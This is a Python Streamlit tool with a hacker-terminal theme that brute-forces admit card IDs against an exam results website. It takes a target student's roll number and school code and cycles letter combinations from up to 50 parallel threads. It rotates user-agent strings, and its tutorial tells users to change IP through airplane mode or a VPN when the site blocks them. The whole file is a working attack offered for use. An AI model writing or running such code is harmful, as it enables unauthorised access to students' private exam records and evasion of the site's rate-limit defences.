import streamlit as st
import requests
from bs4 import BeautifulSoup
import itertools
import string
import time
import random
from concurrent.futures import ThreadPoolExecutor

# --- Terminal Styling Configuration ---
st.set_page_config(page_title="LEGIONNAIRE_OS", page_icon="📟", layout="wide")

# Custom Matrix & Modal Popup CSS Injection
matrix_theme = """
<style>
    /* Main Application Frame */
    .stApp {
        background-color: #000000 !important;
        color: #39FF14 !important;
        font-family: 'Courier New', Courier, monospace !important;
    }
    
    /* Sidebar / Console Control Panel */
    section[data-testid="stSidebar"] {
        background-color: #020a02 !important;
        border-right: 2px solid #39FF14 !important;
    }
    
    /* Global Monospace Text Re-skinning */
    h1, h2, h3, h4, h5, h6, p, label, .stMarkdown, div, span {
        color: #39FF14 !important;
        font-family: 'Courier New', Courier, monospace !important;
        text-shadow: 0 0 2px #00FF00;
    }
    
    /* Interactive Terminal Inputs */
    .stTextInput>div>div>input {
        background-color: #000000 !important;
        color: #39FF14 !important;
        border: 1px solid #39FF14 !important;
        font-family: 'Courier New', Courier, monospace !important;
        box-shadow: inset 0 0 5px #00FF00;
    }
    
    /* Radio and Checkbox Controls */
    div[data-testid="stMarkdownContainer"] p {
        color: #39FF14 !important;
    }
    
    /* Overdrive Activation & Dismiss Buttons */
    .stButton>button {
        background-color: #001a00 !important;
        color: #39FF14 !important;
        border: 2px solid #39FF14 !important;
        box-shadow: 0 0 15px #00FF00;
        font-family: 'Courier New', Courier, monospace !important;
        font-weight: bold !important;
        font-size: 1.2rem !important;
        letter-spacing: 2px;
        width: 100%;
        transition: all 0.3s ease-in-out;
    }
    .stButton>button:hover {
        background-color: #39FF14 !important;
        color: #000000 !important;
        box-shadow: 0 0 25px #39FF14;
    }
    
    /* Custom Popup Window Styling (Modal) */
    div[data-testid="stModal"] div:first-child {
        background-color: #000500 !important;
        border: 2px solid #39FF14 !important;
        box-shadow: 0 0 30px #00FF00 !important;
    }
    
    /* Custom Notification Windows */
    .stAlert {
        background-color: #001100 !important;
        color: #39FF14 !important;
        border: 1px solid #39FF14 !important;
        box-shadow: 0 0 10px #00FF00;
    }
    
    /* Neon Data Loading Matrix Bar */
    .stProgress > div > div > div > div {
        background-image: linear-gradient(to right, #00FF00, #39FF14) !important;
        box-shadow: 0 0 10px #39FF14;
    }
    
    /* Clean Signature Badge */
    .legion-banner {
        border: 2px dashed #39FF14;
        padding: 15px;
        text-align: center;
        background-color: #000a00;
        margin-bottom: 25px;
        box-shadow: 0 0 8px #00FF00;
    }
    .legion-tag {
        font-size: 1.3rem;
        font-weight: bold;
        letter-spacing: 3px;
        animation: blinker 1.5s linear infinite;
    }
    @keyframes blinker {
        50% { opacity: 0.3; }
    }
</style>
"""
st.markdown(matrix_theme, unsafe_allow_html=True)

# --- POPUP MODAL DIALOG ---
@st.dialog("⚙️ INITIALIZATION DIALOGUE // LEGIONNAIRE")
def show_modal_tutorial():
    st.markdown("""
    ### 📡 MATRIX DECRPYTION ENGINE ONLINE
    
    **1. DEFINE VECTOR SPECS:**
    * Fill out the target student's **Roll Number** and **School Code** inside the command module sidebar.
    
    **2. CHOOSE CORRESPONDING SEARCH DEPTH:**
    * **Ultra-Short (1 Letter):** Use if the string has contracted down to **7 total digits** (e.g., `A214510`). Tests 27 variations. Execution takes ~2 seconds.
    * **Standard (2 Letters):** Maps standard **8-digit layouts** (e.g., `AM214510`). Tests 729 variations.
    * **Deep (3 Letters):** Scans for collision bypass codes assigned to common name initials (e.g., `ADM214510`). Tests ~19k variations.
    
    **3. FIREWALL RECOVERY ROUTINE:**
    * If the server flags your endpoint and triggers a **RED BANNER**, toggle **Airplane Mode** or jump nodes on your VPN proxy to regenerate your routing IP, then re-ignite the stream.
    """)
    st.divider()
    if st.button("EXECUTE CONSOLE OVERRIDE"):
        st.session_state.popup_acknowledged = True
        st.rerun()

# Check state memory to handle popup once per script build execution
if "popup_acknowledged" not in st.session_state:
    st.session_state.popup_acknowledged = False

if not st.session_state.popup_acknowledged:
    show_modal_tutorial()

# Main Screen Core Banner
st.markdown("""
<div class="legion-banner">
    <div class="legion-tag">⚡ SYSTEM LOADED // MADE BY LEGIONNAIRE ⚡</div>
</div>
""", unsafe_allow_html=True)

st.title("📟 LEGIONNAIRE_OS: DEEP-SCAN PROTOCOL")

# --- Control Panel Sidebar ---
with st.sidebar:
    st.markdown("### 🖥️ CONSOLE DIRECTIVES")
    roll_no = st.text_input("ENTER ROLL NUMBER:", value="18602421")
    school_code = st.text_input("ENTER SCHOOL CODE:", value="45498")
    fixed_suffix = st.text_input("ENTER ADMIT CARD SUFFIX:", value="4510")
    
    st.divider()
    st.markdown("### ⚙️ SCAN VECTOR SETTINGS")
    scan_mode = st.radio(
        "ALGORITHM DEPTH:", 
        ["Ultra-Short (1 Letter)", "Standard (2 Letters)", "Deep (3 Letters)"],
        index=0
    )
    include_spaces = st.checkbox("PAD MATRIX SPACES", value=True)
    threads = st.slider("COMPUTATIONAL THREADS:", 1, 50, 30)
    start_combo = st.text_input("INITIALIZE VECTOR FROM:", value="A").upper()

base_url = "https://cbseresults.nic.in/class_xii_b_2026_a/ClassTwelfth_ii26.htm"
post_url = "https://cbseresults.nic.in/class_xii_b_2026_a/ClassTwelfth_ii_2026.asp"

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
]

def check_id_sync(combo):
    admit_id = f"{combo}{roll_no[-2:]}{fixed_suffix}"
    session = requests.Session()
    session.headers.update({
        'User-Agent': random.choice(UA_POOL),
        'Referer': base_url,
        'Connection': 'close'
    })
    
    try:
        r_init = session.get(base_url, timeout=7)
        soup = BeautifulSoup(r_init.text, 'html.parser')
        
        payload = {'regno': roll_no, 'sch': school_code, 'admid': admit_id}
        for h in soup.find_all('input', type='hidden'):
            payload[h.get('name')] = h.get('value', '')
        payload['B2'] = 'Submit'

        time.sleep(random.uniform(0.1, 0.2))
        response = session.post(post_url, data=payload, timeout=7)
        
        if "Roll No" in response.text and "Invalid" not in response.text:
            return "SUCCESS", (admit_id, response.text)
        if "Access Denied" in response.text:
            return "BLOCKED", combo
    except:
        pass
    return "FAIL", combo

def run_scan():
    vowels = ['A', 'E', 'I', 'O', 'U']
    chars = vowels + [c for c in string.ascii_uppercase if c not in vowels]
    if include_spaces:
        chars.append(" ")
        
    if "1 Letter" in scan_mode:
        depth = 1
    elif "2 Letters" in scan_mode:
        depth = 2
    else:
        depth = 3
        
    all_combos = ["".join(c) for c in itertools.product(chars, repeat=depth)]
    
    try:
        start_idx = all_combos.index(start_combo)
        search_space = all_combos[start_idx:]
    except ValueError:
        search_space = all_combos

    progress_bar = st.progress(0)
    status_text = st.empty()
    found = False

    st.warning(f"📡 OVERDRIVE ENGAGED // CYCLING {len(search_space)} PARALLEL COMPUTES")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_combo = {executor.submit(check_id_sync, combo): combo for combo in search_space}
        
        for i, future in enumerate(future_to_combo):
            try:
                res_type, data = future.result()
            except:
                continue
            
            done = i + 1
            progress_bar.progress(min(done / len(search_space), 1.0))
            
            display_id = data[0] if res_type == "SUCCESS" else data
            status_text.write(f"📟 [DEPLOYED THREADS: {threads}] Testing Dataframe Vector: **'{display_id}'** | Matrix Stream: {done}/{len(search_space)}")

            if res_type == "SUCCESS":
                admit_id, html = data
                st.success(f"🔓 ENCRYPTED DATASTREAM BROKEN // MATCH FOUND: {admit_id}")
                st.components.v1.html(html, height=800, scrolling=True)
                found = True
                executor.shutdown(wait=False, cancel_futures=True)
                break
            
            if res_type == "BLOCKED":
                st.error(f"🛑 NODE FIREWALL TRIGGERED AT ACCESS ID '{data}'. SHIFT PROXY LAYER / REIGNITE ENGINE.")
                executor.shutdown(wait=False, cancel_futures=True)
                return

    if not found:
        st.info("⚡ DATALINK CYCLED THROUGH ENTIRE SPACE. NO VECTOR MATCH CONVERGED.")

if st.button("⚡ EXECUTE NEURAL BRUTE-FORCE"):
    run_scan()